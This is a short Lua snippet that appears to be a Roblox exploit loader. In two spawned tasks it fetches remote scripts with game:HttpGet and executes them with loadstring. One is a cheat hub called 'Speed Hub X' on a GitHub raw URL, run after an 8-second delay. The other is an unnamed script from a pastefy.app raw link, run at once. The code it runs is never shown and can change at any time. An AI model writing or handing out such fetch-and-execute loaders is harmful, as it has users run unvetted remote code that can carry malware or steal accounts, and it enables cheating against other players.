pcall(function()
    -- Delayed script (runs after 8 seconds)
    task.spawn(function()
        task.wait(8)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
    end)

    -- Immediate script
    task.spawn(function()
        loadstring(game:HttpGet("https://pastefy.app/fHJbns7j/raw"))()
    end)
end)
